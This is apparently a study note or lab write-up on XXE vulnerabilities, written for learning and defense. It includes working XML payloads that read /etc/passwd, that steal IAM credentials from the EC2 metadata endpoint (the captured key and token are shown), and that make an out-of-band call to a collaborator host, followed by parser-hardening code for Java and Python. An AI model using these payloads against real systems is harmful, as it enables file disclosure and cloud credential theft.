##  **XXE (XML External Entity) vulnerability**
XXE (XML External Entity) vulnerability is a security flaw that occurs when an application processes XML input containing references to external entities. If not properly handled, this can lead to **data exposure, file retrieval, SSRF (Server-Side Request Forgery), and even remote code execution** in some cases.  

---

##  **How XXE Works**
1. **XML Processing**: The application parses user-supplied XML.
2. **External Entity Declaration**: If the XML parser is configured to allow external entities (`DOCTYPE` and `SYSTEM`), attackers can inject references to local or remote files.
3. **Data Exfiltration**: The attacker retrieves sensitive files (e.g., `/etc/passwd`) or triggers SSRF by forcing the server to make requests to internal services.

---

##  **Example of a Vulnerable XML**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>  
<root>  
    <data>&xxe;</data>  
</root>
```
 If an application processes this XML, it will replace `&xxe;` with the contents of `/etc/passwd`, exposing sensitive system information.

## **case1: Exploiting XXE using external entities to retrieve files**
```Payload

<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE stockCheck [ <!ENTITY procuctid SYSTEM "file:///etc/passwd"> ]>
    <stockCheck>
        <productId>&procuctid;</productId>
        <storeId>1</storeId>
    </stockCheck>
```    
## **case2: Exploiting XXE to perform SSRF attacks**
```secnerio: The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.
  motive: obtains the server's IAM secret access key from the EC2 metadata endpoint.

payloads

<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE stockCheck [ <!ENTITY procuctid SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
    <stockCheck>
        <productId>&procuctid;</productId>
        <storeId>1</storeId>
</stockCheck>
```
```Response:
            HTTP/2 400 Bad Request

            Content-Type: application/json; charset=utf-8

            X-Frame-Options: SAMEORIGIN

            Content-Length: 552

            "Invalid product ID: {

            "Code" : "Success",

            "LastUpdated" : "2025-03-11T08:19:31.312893341Z",

            "Type" : "AWS-HMAC",

            "AccessKeyId" : "w4CprEoDqP8HcOoLxq1l",

            "SecretAccessKey" : "iGY2bXKWVPmXrG1tllcM4B4pZCq5XivMtFxpbnhm",

            "Token":
"uqqU5kZR1JlvTBF85Eyn2aJDv6zEVFdntShz9zMpqtazw5AQrIkrNisng0DLy0GomI0uqbATyQwBUNw6Ey4YubP4CJnqQAoqO1Qd0lMkkVQPTgtREDUuQiNVAf0qzMUKRsXS7G9pdI6PBfm1g8V0wCNYSKW2YdkWSZaYsOqc4CmXWT4cE0znDrONJ2cN6NpPJCEAFmwO55NDqNnpuMRFovx8DUVs4QdCFDNdW4Vw0JVAQdtU5jsirgxMS4hK1Qkd",

              "Expiration" : "2031-03-10T08:19:31.312893341Z"

            }"
```
## case 3: Blind XXE with out-of-band interaction
``` secnerio: use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.
    payloads:
    <?xml version="1.0" encoding="UTF-8"?>

        <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://pe7r5ma8pmiqhg5yu8d1hkk9b0hr5vtk.oastify.com/"> ]>

        <stockCheck>
            <productId>&xxe;</productId>
            <storeId>1</storeId>
        </stockCheck>
```
---

## 🛠 **Exploiting XXE**
- **File Disclosure**: Load system files using `file:///path/to/file`.
- **SSRF (Server-Side Request Forgery)**: Force the server to request internal/external resources (`http://internal-service/`).
- **Denial of Service (Billion Laughs Attack)**: Overload memory by nesting entities.
- **RCE (in rare cases)**: If the application allows interaction with system commands via an entity, remote code execution might be possible.

---

##  **How to Prevent XXE**
 **Disable DTD Processing** (External Entities):  
- In Java (DOM Parser):
  ```java
  DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
  dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
  ```
- In Python (`lxml` parser):
  ```python
  from lxml import etree
  parser = etree.XMLParser(resolve_entities=False)
  ```

**Use Safe Parsers**: Choose modern, secure XML libraries that disable external entity resolution by default.  
**Input Validation**: Avoid accepting XML input unless necessary.  
**Use JSON Instead of XML**: JSON does not support external entities, reducing the risk of XXE.

## **Refrence** 
   
   https://rohitcoder.medium.com/comprehensive-guide-detecting-fixing-and-defending-against-xxe-attacks-in-python-and-java-e78691b4b918
   
   https://www.w3schools.com/xml/xml_dtd_intro.asp
   
---
